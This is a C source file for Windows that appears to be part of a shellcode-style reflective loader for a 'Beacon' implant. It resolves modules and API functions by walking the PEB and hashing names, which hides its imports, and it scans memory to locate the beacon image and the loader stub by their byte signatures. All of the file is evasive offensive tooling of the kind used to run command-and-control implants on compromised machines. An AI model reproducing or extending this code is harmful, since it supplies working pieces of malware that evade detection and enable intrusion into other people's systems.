#include <Windows.h>

#include "ntdll.h"
#include "hash.h"
#include "macro.h"
#include "instance.h"

#pragma code_seg(".text$b")
void* xGetModuleAddr(DWORD dwModuleHash)
{
	PTEB pCurrentTeb = (PTEB)__readgsqword(0x30);
	PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
	PVOID pLdrDataEntryFirstEntry = (PVOID)((PBYTE)pCurrentPeb->Ldr->InMemoryOrderModuleList.Flink->Flink);

	LIST_ENTRY* pListParser = (LIST_ENTRY*)((DWORD64)pLdrDataEntryFirstEntry - 0x10);
	void* firstEntry = pListParser;
	while (pListParser->Flink != pLdrDataEntryFirstEntry)
	{
		PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)pListParser->Blink;
		if (HashMeDjb2W(pLdrDataEntry->BaseDllName.Buffer) == dwModuleHash)
		{
			return pLdrDataEntry->DllBase;
		}

		if (pListParser->Flink == firstEntry)
		{
			return NULL;
		}
		pListParser = pListParser->Flink;
	}
	return NULL;
}

#pragma code_seg(".text$b")
void* xGetProcAddr(void* pModuleAddr, DWORD dwFunctionHash)
{
	PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleAddr;
	PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleAddr + pImageDosHeader->e_lfanew);
	PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleAddr + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);

	PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleAddr + pImgExportDir->AddressOfFunctions);
	PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleAddr + pImgExportDir->AddressOfNames);
	PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleAddr + pImgExportDir->AddressOfNameOrdinals);

	for (WORD i = 0; i < pImgExportDir->NumberOfNames; i++)
	{
		PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleAddr + pdwAddressOfNames[i]);
		if (HashMeDjb2A(pczFunctionName) == dwFunctionHash)
		{
			return (PBYTE)pModuleAddr + pdwAddressOfFunctions[pwAddressOfNameOrdinales[i]];
		}
	}

	return NULL;
}

#pragma code_seg(".text$b")
ULONG_PTR FindBeacon()
{
	ULONG_PTR imageBase = (ULONG_PTR)_ReturnAddress();
	while (TRUE) {
		if (((PIMAGE_DOS_HEADER)imageBase)->e_magic == IMAGE_DOS_SIGNATURE) {
			ULONG_PTR ntHeader = ((PIMAGE_DOS_HEADER)imageBase)->e_lfanew;
			if (ntHeader >= sizeof(IMAGE_DOS_HEADER) && ntHeader < 1024) {
				ntHeader += imageBase;
				if (((PIMAGE_NT_HEADERS)ntHeader)->Signature == IMAGE_NT_SIGNATURE) {
					return imageBase;
				}
			}
		}
		imageBase++;
	}

}

#pragma code_seg(".text$b")
BOOL _memcpy(void* dest, void* src, size_t size) 
{
	if (dest == NULL || src == NULL) {
		return FALSE;
	}
	char* csrc = (char*)src;
	char* cdest = (char*)dest;
	for (size_t i = 0; i < size; i++) {
		cdest[i] = csrc[i];
	}
	return TRUE;
}

#pragma code_seg(".text$b")
DWORD _strlenA(PBYTE lpName)
{
	for (int i = 0; ; i++)
	{
		if (lpName[i] == 0x00)
		{
			return i;
		}
	}
}

#pragma code_seg(".text$b")
BOOL IsLoader(PBYTE data)
{
	if (
		data[0] == 0x48 &&
		data[1] == 0x89 &&
		data[2] == 0x5c &&
		data[3] == 0x24
		)
		return TRUE;
	else
		return FALSE;
}

#pragma code_seg(".text$b")
VOID GetLoaderInfo(PLOADER_INFO ldrInfo, ULONG_PTR uBeaconAddr)
{
	ULONG_PTR memAddr = (ULONG_PTR)_ReturnAddress();

	while (TRUE)
	{
		if (IsLoader((PBYTE)memAddr))
			break;
		else
			memAddr--;
	}
	ldrInfo->pLoaderAddr = (PVOID)memAddr;
	ldrInfo->dwLoaderSize = (uBeaconAddr - memAddr);
}